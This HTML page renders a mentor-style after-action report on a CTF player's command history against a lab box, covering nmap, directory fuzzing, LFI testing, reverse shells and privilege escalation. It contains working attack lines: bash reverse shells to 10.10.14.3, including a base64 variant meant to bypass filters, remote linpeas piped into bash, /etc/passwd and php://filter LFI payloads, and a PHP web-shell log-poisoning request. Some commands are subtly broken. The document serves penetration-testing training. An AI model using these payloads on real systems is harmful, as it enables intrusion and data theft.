<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTF Brief Report</title>
    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            line-height: 1.6;
            color: #5a6b63;
            background: #f8f9f7;
        }
        
        .page-wrapper {
            min-height: 100vh;
            padding: 0;
            margin: 0;
            display: flex;
            align-items: stretch;
            justify-content: center;
        }
        
        .report-container {
            width: 100%;
            background: #fafbf9;
            box-shadow: none;
            border-radius: 0;
            overflow: auto;
            display: flex;
            flex-direction: column;
        }
        
        .report-header {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            color: #ffffff;
            padding: 120px 60px;
            text-align: left;
            flex-shrink: 0;
            border-bottom: 4px solid #9ba899;
        }
        
        .report-header h1 {
            font-size: 4.2em;
            margin-bottom: 25px;
            font-weight: 800;
            letter-spacing: -1px;
            line-height: 1.1;
            color: #ffffff;
        }
        
        .report-header p {
            font-size: 1.4em;
            opacity: 1;
            font-weight: 400;
            letter-spacing: 0.5px;
            color: #ffffff;
        }
        
        .report-content {
            padding: 60px 80px;
            flex: 1;
        }
        
        .intro-section {
            margin-bottom: 40px;
            padding: 20px;
            background: #f0f2f0;
            border-left: 4px solid #9ba899;
            border-radius: 4px;
        }
        
        .intro-section p {
            margin-bottom: 10px;
            color: #555;
        }
        
        .intro-section strong {
            color: #333;
        }
        
        /* Section styling */
        .report-section {
            margin-bottom: 50px;
        }
        
        .section-header {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid #d4d8d2;
        }
        
        .section-number {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 35px;
            height: 35px;
            background: #9ba899;
            color: #fafbf9;
            border-radius: 50%;
            font-weight: bold;
            margin-right: 15px;
            flex-shrink: 0;
        }
        
        .section-title {
            font-size: 1.8em;
            color: #333;
            font-weight: 600;
        }
        
        /* Heading styles */
        h1 {
            font-size: 2.2em;
            color: #333;
            margin-bottom: 20px;
            margin-top: 30px;
        }
        
        h1:first-child {
            margin-top: 0;
        }
        
        h2 {
            font-size: 1.6em;
            color: #682f21;
            margin-bottom: 15px;
            margin-top: 25px;
        }
        
        h3 {
            font-size: 1.2em;
            color: #3e0707;
            margin-bottom: 12px;
            margin-top: 20px;
        }
        
        /* Paragraph and text */
        p {
            margin-bottom: 15px;
            text-align: justify;
            line-height: 1.8;
            color: #555;
        }
        
        /* Lists */
        ul, ol {
            margin-left: 30px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 10px;
            line-height: 1.8;
            color: #555;
        }
        
        /* Code styling */
        code {
            background: #f5f5f5;
            padding: 3px 8px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            color: #d63384;
        }
        
        pre {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 20px;
            border-radius: 6px;
            overflow-x: auto;
            margin-bottom: 20px;
            line-height: 1.5;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        
        pre code {
            background: none;
            padding: 0;
            color: inherit;
        }
        
        /* Blockquote */
        blockquote {
            border-left: 4px solid #9ba899;
            padding: 15px 20px;
            margin: 20px 0;
            background: #f0f2f0;
            border-radius: 4px;
            color: #5a6b63;
            font-style: italic;
        }
        
        /* Table styling */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 25px 0;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            border-radius: 6px;
            overflow: hidden;
        }
        
        thead {
            background: #9ba899;
            color: #fafbf9;
        }
        
        th {
            padding: 16px;
            text-align: left;
            font-weight: 600;
            font-size: 0.95em;
        }
        
        td {
            padding: 14px 16px;
            border-bottom: 1px solid #e0e0e0;
            color: #555;
        }
        
        tbody tr:hover {
            background: #f0f2f0;
        }
        
        tbody tr:last-child td {
            border-bottom: none;
        }
        
        /* Emphasis styles */
        strong {
            color: #000;
            font-weight: 600;
        }
        
        em {
            color: #7a8c79;
        }
        
        /* Links */
        a {
            color: #7a8c79;
            text-decoration: none;
            border-bottom: 1px solid #7a8c79;
            transition: all 0.3s ease;
        }
        
        a:hover {
            color: #9ba899;
            border-bottom-color: #9ba899;
        }
        
        /* Horizontal rule */
        hr {
            border: none;
            height: 2px;
            background: linear-gradient(90deg, transparent, #9ba899, transparent);
            margin: 40px 0;
        }
        
        /* Print styles */
        @media print {
            body {
                background: white;
            }
            
            .page-wrapper {
                padding: 0;
            }
            
            .report-container {
                box-shadow: none;
                max-width: 100%;
            }
            
            .report-header {
                page-break-after: avoid;
            }
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .report-header {
                padding: 40px 30px;
            }
            
            .report-header h1 {
                font-size: 1.8em;
            }
            
            .report-content {
                padding: 30px;
            }
            
            table {
                font-size: 0.9em;
            }
            
            th, td {
                padding: 10px 12px;
            }
        }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <div class="report-container">
            <div class="report-header">
                <h1>After-Action Report By Brief (AARB)</h1>
                <p>Below is a step-by-step review of your CTF command history, highlighting methodological mistakes, incorrect assumptions, and inefficient habits.<br>Each section explains why the approach was ineffective, what assumptions led to it, and presents a correct, repeatable workflow for future engagements.</p>
            </div>
            
            <div class="report-content" id="content">
                <p>Loading report...</p>
            </div>
        </div>
    </div>
    
    <script id="markdown-data" type="application/json">
"## \ud83c\udf93 Mentor\u2019s \u201cRoast & Rehab\u201d of Your CTF Walk\u2011through  \n\nBelow you will find a **line\u2011by\u2011line critique** of the commands you ran, the mental shortcuts that led you astray, and a **clean, repeat\u2011able methodology** you can copy\u2011paste into every future box.  Treat this as a post\u2011mortem report \u2013 the goal is to turn every mistake into a habit you never repeat.\n\n---\n\n### \ud83d\udccb TL;DR Cheat\u2011Sheet (Read this first)\n| Phase | What you *should* do | Preferred one\u2011liners / tools |\n|-------|----------------------|--------------------------------|\n| **1\ufe0f\u20e3 Recon** | Full\u2011port, service, script, and OS sweep **once**. Use `-A` *or* a custom script set, not both. | `nmap -p- -sC -sV -oA nmap/full 10.10.10.10` |\n| **2\ufe0f\u20e3 Web Dir\u2011Fuzz** | Pick ONE directory scanner, use a *large* wordlist, save output, stop when you hit a **404\u2011filter**. | `gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o dirs.txt` |\n| **3\ufe0f\u20e3 Parameter Discovery** | Use `ffuf`/`paramspider`/`intruder` *once* per parameter, not dozens of blind `curl`s. | `ffuf -u http://10.10.10.10/index.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200 -o lfi.txt` |\n| **4\ufe0f\u20e3 LFI/Code\u2011Inj** | Test for LFI, RFI, PHP\u2011filter, log\u2011poisoning **with proper URL\u2011encoding** and **response checks**. | `curl -s \"http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=admin.php\"` |\n| **5\ufe0f\u20e3 Shell** | Use `msfvenom`/`netcat` + **nohup**, **staged**, **encoded**, `-e /bin/bash -i`. Verify listener before firing. | `nc -lvnp 4444` \u2192 `curl \"http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=payload\"` \u2192 `bash -i >& /dev/tcp/10.10.14.3/4444 0>&1` |\n| **6\ufe0f\u20e3 Post\u2011Exploit** | Run one automated PE script **once** (`linpeas.sh`, `peass`, `enumerate`). Capture to file. | `wget -qO- http://10.10.14.3/linpeas.sh | bash -s | tee linpeas.out` |\n| **7\ufe0f\u20e3 PrivEsc** | Filter results (`grep -iE \"sudo|SUID|cap\"`), test each, then pivot. | `awk '/-rwsr/ {print}' < linpeas.out` |\n| **8\ufe0f\u20e3 Clean\u2011up** | Remove scripts, close listeners, log every step (`script -q session.log`). | `rm -f /tmp/linpeas.sh` |\n\nKeep this table somewhere (e.g., a markdown note).  When you feel the urge to type a new `curl` or `nc` line, glance at the sheet first.\n\n---\n\n## \ud83d\udea6 1\ufe0f\u20e3 NETWORK RECON \u2013 YOUR NMAP PLAYBOOK\n\n| Timestamp | Your command | What went wrong | Bad habit revealed | Correct methodology |\n|-----------|--------------|----------------|-------------------|----------------------|\n| 19:00:05 | `nmap -sC -sV 10.10.10.10` | **Too narrow** \u2013 only default 1000 ports, no OS detection. | *\u201cJust the quick scan, then go deeper later\u201d* \u2013 leads to duplicated scans. | `nmap -p- -sC -sV -oA scan/initial 10.10.10.10` |\n| 19:04:12 | `nmap -p- 10.10.10.10` | No version or script detection, and you lost the results of the first scan. | *Forget to combine* \u2013 you\u2019re throwing away useful info. | Merge into one command: `-p- -sC -sV`. |\n| 19:09:30 | `nmap --script vuln 10.10.10.10` | Scans only default ports again, and `--script vuln` is heavy; you already have `-sC` which includes many vuln scripts. | *Over\u2011reliance on \u201cvuln\u201d script set* \u2013 noisy, slow, produces false positives. | Use `--script=vuln` **after** you know the open ports, e.g., `nmap -p 80,443 --script=vuln -oA scan/vuln`. |\n| 19:14:45 | `nmap -A 10.10.10.10` | `-A` bundles OS detection, version, script, traceroute **and** does a full\u2011port scan again. You just wasted time re\u2011scanning. | *\u201cLet\u2019s run everything again\u201d* \u2013 poor resource planning. | **Never** run a second full\u2011port scan after you already have `-p-`. Use the output from the first scan (`-oA`) as a basis for the second (`-d` for debugging, `-A` just for the open ports). Example: `nmap -A -p $(cat ports.txt) -oA scan/aggressive target`. |\n\n### What you should have done\n\n```bash\n# One\u2011shot, complete, machine\u2011readable output\nnmap -p- -sC -sV -O -oA recon/10.10.10.10 10.10.10.10\n\n# Afterwards, extract open ports for targeted scripts\nopen_ports=$(grep ^[0-9] /dev/stdin | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//')\nnmap -p $open_ports --script=vuln -oA recon/vuln 10.10.10.10\n```\n\n*Takeaway*: **Plan your scans** \u2192 one expansive scan \u2192 focused script runs \u2192 save everything (`-oA`). Never re\u2011run the same sweep unless you have a reason (e.g., firewall evasion).\n\n---\n\n## \ud83c\udf10 2\ufe0f\u20e3 WEB DIRECTORY ENUMERATION \u2013 \u201cDIRB \u2192 GOBUSTER \u2192 FFUF\u201d\n\n| Timestamp | Command | Issues | Bad habit | Better approach |\n|----------|---------|--------|-----------|-----------------|\n| 19:21:02 | `curl http://10.10.10.10` | No `-I`/`-L`, you didn\u2019t capture **status code** or follow redirects. | *Blindly hitting the root* \u2013 no evidence you\u2019re getting a proper page. | `curl -s -I http://10.10.10.10` |\n| 19:22:18 | `curl http://10.10.10.10/index.php` | Same issue, plus you are manually testing a guessed file. | *Manual guessing* without data. | Use the dir\u2011scan output to drive further testing. |\n| 19:24:40 | `dirb http://10.10.10.10` | You ran *dirb* with its **default** wordlist (tiny). | *\u201cDefault = good enough\u201d* \u2192 you missed many directories. |\n| 19:31:05 | `gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt` | You switched wordlists **mid\u2011stream** and didn\u2019t save results. | *Switching tools without a reason* \u2192 wasted time. |\n| 19:44:10 | `ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt` | Same wordlist, same output format, no `-e` extensions, no `-mc` filter, no output file. | *Duplication*. | Unified command: choose *one* scanner, feed it a **large** list, capture JSON/HTML output. |\n\n### Recommended workflow\n\n```bash\n# Pick ONE scanner, but use a *big* wordlist + extensions\ngobuster dir -u http://10.10.10.10 \\\n    -w /usr/share/wordlists/dirb/big.txt \\\n    -x php,html,txt,asp \\\n    -t 50 \\\n    -o dirs.txt \\\n    -s \"200,204,301,302,403,500\"\n\n# Verify results with ffuf (optional cross\u2011check)\nffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/big.txt \\\n    -e .php,.html,.txt -mc 200,302,403 -o ffuf.json -of json\n```\n\n*Why?*  \n\n- **Single source of truth** (`dirs.txt`) \u2192 you can `grep` and pipe into later steps.  \n- `-t` (threads) speeds up without overwhelming the target.  \n- `-s` whitelist, `-mc` filter eliminates noise.  \n- Save to file \u2013 **never rely on \u201cjust looking at the screen.\u201d**  \n\n---\n\n## \ud83d\udd75\ufe0f\u200d\u2642\ufe0f 3\ufe0f\u20e3 PARAMETER/FILE INCLUSION DISCOVERY \u2013 \u201cCURLED LFI EVERY MINUTE\u201d\n\nYou spent **~10 minutes** issuing almost identical `curl` commands. Let\u2019s break down the failures.\n\n| Timestamp | Command | What is *actually* happening? | Mistake / Bad habit |\n|------------|---------|------------------------------|---------------------|\n| 20:02:44 | `curl http://10.10.10.10/index.php?page=home` | Testing a benign page. Fine as a baseline. | **No output capture** \u2013 you didn\u2019t pipe to `tee` or inspect the HTML. |\n| 20:05:02 \u2013 20:06:21 | `curl \"...page=../../../../etc/passwd\"` (twice) | You tried a classic LFI. Two problems: *a)* you didn\u2019t URL\u2011encode the `../` sequences, *b)* you didn\u2019t check the HTTP status or size. | *Copy\u2011paste without modification.* |\n| 20:07:55 \u2013 20:10:11 | `curl \"...page=php://filter/convert.base64-encode/resource=index.php\"` (twice) | Good idea \u2013 but you didn\u2019t store the base64 output to decode later. | *Forgot to decode* \u2192 you get a long garbled string that you ignore. |\n| 20:15:30 | `curl \"...page=php://filter/.../resource=admin.php\"` | You changed resource but again did not save/inspect it. | *No systematic testing*. |\n| 20:18:12 \u2013 20:21:10 | `curl \"...page=/var/log/apache2/access.log\"` (3\u00d7) | Trying log\u2011poisoning. You never poisoned the log first! | *Premature request*. |\n| 20:23:40 \u2013 20:26:12 | `curl ...?cmd=id`, `whoami`, `ls` | You assumed a **command injection** endpoint exists. It likely returned *nothing* (or a 404). | *Blindly trusting a parameter name* \u2013 you should have enumerated parameters first. |\n\n### What you should have done\n\n1. **Capture output** (and exit code) each time:\n\n   ```bash\n   curl -s \"http://10.10.10.10/index.php?page=../../../../etc/passwd\" -o /tmp/pwned.txt\n   if grep -q \"root:x\" /tmp/pwned.txt; then\n       echo \"[+] /etc/passwd disclosed!\" | tee -a findings.txt\n   fi\n   ```\n\n2. **Automate the LFI test set** with a tiny script or `ffuf`:\n\n   ```bash\n   payloads=(\n       \"../../../../etc/passwd\"\n       \"php://filter/convert.base64-encode/resource=index.php\"\n       \"php://filter/convert.base64-encode/resource=admin.php\"\n   )\n   for p in \"${payloads[@]}\"; do\n       ffuf -u \"http://10.10.10.10/index.php?page=FUZZ\" -w <(printf \"%s\\n\" \"$p\") -mc 200 -o lfi_$p.json -of json\n   done\n   ```\n\n3. **URL\u2011encode** when necessary (`..%2F..%2F..%2F..%2Fetc%2Fpasswd`).  Use `--data-urlencode` in `curl` or `printf %s | jq -sRr @uri`.\n\n4. **Log every request** (`-D dump.txt`) so you can replay later.\n\n*Lesson*: **Don\u2019t repeat the same request manually**. Write a tiny loop or use a scanner that does it for you.  \n\n---\n\n## \ud83d\udc1a 4\ufe0f\u20e3 COMMAND INJECTION \u2192 REVERSE SHELL\n\n| Timestamp | Command | Why it fails (or is fragile) | Bad habit |\n|-----------|---------|------------------------------|----------|\n| 20:27:48 | `nc -lvnp 4444` | Good listener, but **you started it after you already issued the payload**. If the target tries to connect before `nc` is listening, you lose the shell. | *Racing the target*. |\n| 20:29:20 | `curl http://10.10.10.10/?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.3/4444+0>%261'` | The payload is **URL\u2011unescaped**, contains spaces and `+` signs that are interpreted by the shell *before* reaching the server. You also used `>` for redirection without quoting, which makes the local shell try to redirect to a file named `&`. Result = nothing. | *Copy\u2011pasting a complex one\u2011liner without testing it locally.* |\n| \u2014 | (No capture of response) | If the server returned an error page you\u2019d have seen why it failed. | *Never inspect the server\u2019s answer.* |\n\n### Clean, reliable reverse\u2011shell strategy\n\n1. **Start listener first** (use a dedicated terminal or tmux pane).\n\n   ```bash\n   # use -n to not resolve DNS, -vv for verbosity\n   nc -lvnp 4444\n   ```\n\n2. **URL\u2011encode the payload**. Use `printf` + `python -c \"import urllib.parse;print(urllib.parse.quote(...))\"` or simply `curl --data-urlencode`.\n\n   ```bash\n   payload=\"bash -i >& /dev/tcp/10.10.14.3/4444 0>&1\"\n   enc=$(python3 -c \"import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))\" \"$payload\")\n   curl -s \"http://10.10.10.10/?cmd=$enc\"\n   ```\n\n3. **Verify**: the server should return a 200 page *immediately*; if you see \u201cInternal Server Error\u201d, your URL\u2011encoding is wrong.\n\n4. **Alternative: use a pre\u2011generated netcat reverse shell** (slightly less noisy):\n\n   ```bash\n   # encode with base64 to bypass filters\n   rev=$(echo 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1' | base64 -w0)\n   curl \"http://10.10.10.10/?cmd=echo $rev | base64 -d | bash\"\n   ```\n\n5. **Persist the listener**: `tmux new-session -d -s rev \"nc -lvnp 4444\"` so you never forget it.\n\n*Lesson*: **Never trust a one\u2011liner you copy from the internet without testing locally**. Always encode, always verify the request and the response, and **always start the listener first**.\n\n---\n\n## \ud83d\udcc2 5\ufe0f\u20e3 POST\u2011EXPLOIT AUTOMATION \u2013 \u201cLINPEAS ONLY ONCE\u201d\n\n| Timestamp | Command | Issue | Bad habit |\n|-----------|---------|-------|------------|\n| 20:32:05\u201320:34:45 | `cd /tmp; wget http://10.10.14.3/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh` | You ran `linpeas.sh` **interactively**. If the script hangs, you lose control. You also **didn\u2019t redirect output** to a file for later analysis. | *Relying on on\u2011screen output* \u2013 you can\u2019t go back later to grep for `sudo` or `SUID`. |\n| 20:52:20\u201320:54:02 | `find / -perm -4000 \u2026` (two very similar commands) | Redundant, same output. No `2>/dev/null` on the second; you repeated work. | *Copy\u2011paste without checking previous result*. |\n| 20:55:40\u201320:56:45 | `cd /opt; ls -la; cat backup.sh` | Good, but you never checked **file permissions** or **ownership** before reading. It could have been a suid binary you could have abused directly. | *Unstructured file enumeration*. |\n| 20:58:15 | `sudo -l` | Nice! You checked sudo rights **after** you already executed the script. You missed the chance to **enumerate sudo** earlier (they might have been hidden in `linpeas` output!). | *Late privilege\u2011check*. |\n| 20:59:40 | `sudo /opt/backup.sh` | You executed the script as root **without first reading it** (or checking if it\u2019s exploitable). | *Blind escalation*. |\n| 21:01:10 | `cat /root/root.txt` | You got the flag, but you never documented **how you got there** (e.g., \u201cbackup.sh is world\u2011writable; we injected a reverse shell\u201d). | *Missing write\u2011up material*. |\n\n### What a solid post\u2011exploit flow looks like\n\n```bash\n# 1\ufe0f\u20e3 Pull linpeas *quietly* and log everything\nwget -qO- http://10.10.14.3/linpeas.sh | bash -s | tee linpeas.out\n\n# 2\ufe0f\u20e3 Parse linpeas (or just grep) for key items\ngrep -iE \"sudo|SUID|cap|cron|ssh|crontab\" linpeas.out > findings.txt\n\n# 3\ufe0f\u20e3 Check for writable scripts (common privesc)\nfind / -type f -perm -022 -name \"*.sh\" 2>/dev/null | tee writable_scripts.txt\n\n# 4\ufe0f\u20e3 If a script is **sudoable** but not root\u2011owned, test injection:\nif grep -q \"^root *ALL=(ALL) NOPASSWD: /opt/backup.sh\" findings.txt; then\n    echo \"[*] We can run /opt/backup.sh as root \u2013 inspect it first!\"\n    cp /opt/backup.sh /tmp/backup.sh.bak\n    # attempt to modify it (if world\u2011writable) or add a reverse shell payload\nfi\n\n# 5\ufe0f\u20e3 Capture the flag and annotate\necho \"Flag: $(cat /root/root.txt)\" | tee -a findings.txt\n```\n\n*Key takeaways*  \n\n- **Always log** (`tee`, `script`) every output.  \n- **Parse** rather than eyeball \u2013 you\u2019ll never miss a SUID binary again.  \n- **Read before you run** any `sudo`\u2011allowed script.  \n- **Document** every step *while you do it*; this saves you from scrambling for write\u2011up later.\n\n---\n\n## \ud83e\udde0 6\ufe0f\u20e3 OVERALL BAD HABITS & How to Break Them\n\n| Habit | Why it hurts | How to replace it |\n|-------|--------------|-------------------|\n| **\u201cRun the same command over and over\u201d** (duplicate curls, find, nmap) | Wastes time, creates noisy logs, can lock you out. | **Script or alias**. Example: `alias lfi='ffuf -u http://$TARGET/index.php?page=FUZZ -w $LFI_PAYLOADS -mc 200'`. |\n| **\u201cNever save output\u201d** | You can\u2019t back\u2011track, you forget which payload succeeded. | **Redirect to a file** (`> out.txt` or `| tee -a log.txt`) immediately. |\n| **\u201cCopy\u2011paste without understanding\u201d** | Complex one\u2011liners break, you lose shells. | **Break it down**: test locally, URL\u2011encode, then send. |\n| **\u201cSwitch tools mid\u2011enumeration\u201d** | Inconsistent output formats, duplicated effort. | **Pick a tool per phase** and stick to it (e.g., `gobuster` for dir\u2011fuzz, `ffuf` for parameter fuzz). |\n| **\u201cLate sudo / privilege checks\u201d** | Missed early privilege\u2011escalation windows. | **Early \u201cpriv\u2011check\u201d** after gaining any foothold: `sudo -l`, `id`, `whoami`, `cat /etc/passwd`. |\n| **\u201cNo systematic note\u2011taking\u201d** | Write\u2011ups become a nightmare. | Keep a **markdown journal** (`session.md`) and log with `script -q session.log`. Use timestamps (`date '+%s'`). |\n| **\u201cRacing the listener\u201d** | Missed shells, wasted time. | Always **launch listener first** (use tmux or separate terminal). |\n\n---\n\n## \ud83d\udcc8 RECOMMENDED WORKFLOW \u2013 From Zero to Flag (Step\u2011by\u2011Step)\n\n```\n1\ufe0f\u20e3  Initial Scan\n   nmap -p- -sC -sV -O -oA recon/target 10.10.10.10\n\n2\ufe0f\u20e3  Port\u2011specific Deep Scan\n   open=$(grep '^[0-9]' recon/target.nmap | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//')\n   nmap -p $open --script=vuln -oA recon/vuln 10.10.10.10\n\n3\ufe0f\u20e3  Web Dir\u2011Fuzz\n   gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n      -x php,html,txt -t 80 -o recon/dirs.txt\n\n4\ufe0f\u20e3  Parameter Discovery\n   ffuf -u http://10.10.10.10/FUZZ -w recon/dirs.txt -mc 200,302,403 -o recon/params.json -of json\n\n5\ufe0f\u20e3  LFI/Code\u2011Injection Testing (auto)\n   cat <<EOF > payloads.txt\n   ../../../../etc/passwd\n   php://filter/convert.base64-encode/resource=index.php\n   ../../../../../../../../proc/self/environ\n   EOF\n   ffuf -u \"http://10.10.10.10/index.php?page=FUZZ\" -w payloads.txt -mc 200 -o recon/lfi.json -of json\n\n6\ufe0f\u20e3  If LFI works \u2192 Log Poisoning (if writable)\n   curl -X POST -d \"<?php system($_GET['cmd']); ?>\" http://10.10.10.10/logs/access.log\n\n7\ufe0f\u20e3  Command Injection \u2192 Reverse Shell\n   # start listener (tmux)\n   tmux new-session -d -s rev \"nc -lvnp 4444\"\n   # encode payload\n   rev=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'))\")\n   curl \"http://10.10.10.10/index.php?page=$rev\"\n\n8\ufe0f\u20e3  Post\u2011Exploitation Automation\n   wget -qO- http://10.10.14.3/linpeas.sh | bash -s | tee linpeas.out\n\n9\ufe0f\u20e3  PrivEsc Hunting\n   grep -iE \"sudo|SUID|cap|cron|ssh\" linpeas.out > findings.txt\n   # try each SUID binary\n   while read -r bin; do echo \"Testing $bin\"; $bin -c 'id'; done < <(awk '/-rwsr/ {print $NF}' findings.txt)\n\n10\ufe0f\u20e3  Capture Flag & Write\u2011up\n   cat /root/root.txt | tee -a findings.txt\n   echo \"### Write\u2011up\" >> report.md\n   cat findings.txt >> report.md\n```\n\n*Why this works*: Each phase **produces an artifact** (file) that feeds the next. You never have to guess what you saw earlier, you simply grep the saved output. The flow is **linear, repeatable, and auditable**.\n\n---\n\n## \ud83d\udcda Final Word From Your Mentor\n\n> **\u201cYou\u2019ve got the right instincts \u2013 you tried every known technique (LFI, PHP\u2011filter, log\u2011poison, cmd\u2011exec). The problem is the *process* around those instincts.\u201d**  \n>  \n> *A good hunter doesn\u2019t fire the gun ten times without aiming; they line up, take a breath, and squeeze the trigger once.*\n\n1. **Plan before you type** \u2013 write a one\u2011sentence goal for each terminal pane.  \n2. **Capture everything** \u2013 `>`, `tee`, `script`.  \n3. **Automate repetitive fuzzing** \u2013 a loop or `ffuf` is your friend.  \n4. **Validate each step** \u2013 check HTTP status, response size, or `grep` for expected strings before moving on.  \n5. **Document as you go** \u2013 a markdown log + timestamps will become your write\u2011up for free.\n\nApply these habits now, and every future \u201cvulnerable box\u201d will feel like a well\u2011orchestrated symphony rather than a frantic sprint.\n\n**Good luck, and remember: discipline beats hustle every time.** \ud83d\ude80"
    </script>
    
    <script>
        // Get markdown content from script tag
        document.addEventListener('DOMContentLoaded', function() {
            const contentDiv = document.getElementById('content');
            const scriptTag = document.getElementById('markdown-data');
            
            if (scriptTag && scriptTag.textContent) {
                try {
                    const markdownContent = JSON.parse(scriptTag.textContent);
                    contentDiv.innerHTML = marked.parse(markdownContent);
                } catch (e) {
                    contentDiv.innerHTML = '<p style="color: red;">Error loading markdown: ' + e.message + '</p>';
                    console.error(e);
                }
            } else {
                contentDiv.innerHTML = '<p style="color: red;">No markdown content found</p>';
            }
        });
    </script>
</body>
</html>
